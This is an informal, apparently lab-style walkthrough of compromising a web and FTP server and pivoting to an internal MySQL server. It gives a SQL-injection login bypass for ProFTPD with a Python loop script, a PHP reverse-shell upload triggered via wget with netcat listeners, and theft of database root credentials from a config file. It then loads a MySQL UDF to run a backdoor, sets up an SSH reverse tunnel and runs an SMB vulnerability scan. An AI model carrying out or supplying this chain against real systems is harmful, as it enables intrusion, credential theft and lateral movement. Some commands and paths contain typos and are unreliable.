[Introduction]
Web Server and File Server are exposed to the Internet.

Quickly doing nmap scan

#nmap -p 80,21 <hostname>

After verifying both services are running 

Gathering more information

#nc -v <hostname> 80

HEAD / HTTP/1.1

#ftp <hostname>

Bit more information gathering it is running proFTP Server.

username: and 1=2 union select 1,1,uid,gid,homedir,shell from ftpuser; --

we got 
ftp>

This gr8 starting point.

we have to find ftp user home directory mapping to web server Document Root which will allow us to 
run some code.

Sample Python Script

#!/usr/bin/python
from ftplib import FTP
print "Attempting User Directory Discovery via FTP"

for i in range(0,6):
    username="%') and 1=2 union select 1,1,uid,gid,homedir,shell from ftpuser LIMIT " + str(i) +", 1; -- "
    password=str("1")
    ftp=FTP("<hostname>")
    ftp.login(username,password)
    print "Logged in as user "+str(i)+",1"
    ftp.retrlines('LIST')
    ftp.close()

Print out the home direcotry of user.

We found user's(X) whose home directory mapped to web direcoory DocumentRoot.

Now try to login to ftp server using X user.
#ftp <hostname>

username: %') and a=2 union select 1,1,uid,gid,homedir,shell from ftpuser LIMIT 5,1; --

In password field hit enter.

ftp>

ftp> ls

we see the web user DocumentRoot.

ftp>put rs.php

start uploading reverse shell php backdoor to web server DocumentRoot.

Start the reverse shell listening at port 80 from attacking machine.
#nc -lnp 80  (Y)

Trigger the reverse shell in web server using wget.

#wget <hostname>/rs.php

we should get the shell at (Y)

we got login as web user (www-data). 
$id 
uid=33(www-data), gid=33(www-data) groups=33(www-data)

$/sbin/ifconfig


get network interface information.

look configure.php

which has database infromation.

We try to login to database server from compromized web server.

We are going to dump all the database users into our writable local directory.
Note: Sometimes we cannot write data to localserver in such case we can start WireShark and capture the database 
$mysqldumo -u root -p<passord_from_config.php> -h <database_server> <database_name>  > /var/www/images/datadump.txt

We can access database dump from our Web Browser.
http://<webserver>/var/www/images/datadump.txt

Database server is hosted in different machine than Web Server inside non-routable internal network.

After looking more on configure.php we found that root user is used to login to database server.
Note: This is gr8 mistake. But good from attacker's view.

we quickly upload the utility file helper.html and helper.php.
Which allow us to upload malicious code to web server.
This helper.php can upload binary file to web server and loaded into a remote database server using the database 
credential we found from configure.php


Let login to internal MySql Database server using the credentials we found from configure.php.
$mysql -u root -p<pass> -h <databaseserver_ip>

use pwn;
select imgdata from binfile where title="1" into dumpfile '/usr/lib/lib_mysqludf_sys.so' ;
select imgdata from binfile where title="2" into dumpfile '/tmp/bd';
select sys_eval('chmod 755 /tmp/bd');

$mysql -u root -p<pass> -h <databaseserver_ip>

use pwn;
CREATE FUNCTION lib_mysqludf_sys_info RETURNS string SONAME 'lib_mysqludf_sys.so';
CREATE FUNCTION sys_get RETURNS string SONAME 'lib_mysqludf_sys.so';
CREATE FUNCTION sys_set RETURNS string SONAME 'lib_mysqludf_sys.so';
CREATE FUNCTION sys_exec RETURNS string SONAME 'lib_mysqludf_sys.so';
CREATE FUNCTION sys_eval RETURNS string SONAME 'lib_mysqludf_sys.so';

SELECT sys_eval('chmod 755 /tmp/bd');
SELECT sys_eval('/tmp/bd &');  --------------------> start reverse listening netcat from attacker's machine #nc -nlp 80

We have reverse shell from internal mysql server.

Do little tunneling. 


#ping -c 1 mail server

Create reverse tunnel

#ssh -l root -t -t -R 445:<ip>:445  <ip>

use

#netstat -antp

#nmap -sS 127.0.0.1 -p 445 --script --smb-check-vulns.nse










